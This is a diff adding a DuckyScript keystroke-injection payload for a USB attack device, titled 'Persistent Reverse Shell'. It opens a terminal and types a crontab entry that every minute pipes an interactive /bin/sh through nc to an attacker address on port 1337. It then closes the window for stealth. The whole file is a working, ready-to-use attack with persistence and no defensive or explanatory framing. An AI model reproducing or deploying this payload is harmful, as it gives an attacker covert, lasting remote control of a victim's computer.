@@ -1,0 +1,17 @@
+REM Title: Persistent Reverse Shell
+REM Author: UndedInside
+REM Description: Uses cron to set up a persistent reverse shell to the attacker
+
+DEFAULT_DELAY 500
+
+REM Open terminal:
+GUI SPACE
+STRING terminal
+ENTER
+
+REM Create cron job and run it
+STRING (crontab -l 2>/dev/null; echo "* * * * * rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.172 1337 > /tmp/f") | crontab -
+ENTER
+
+REM Close the window for stealth
+GUI w
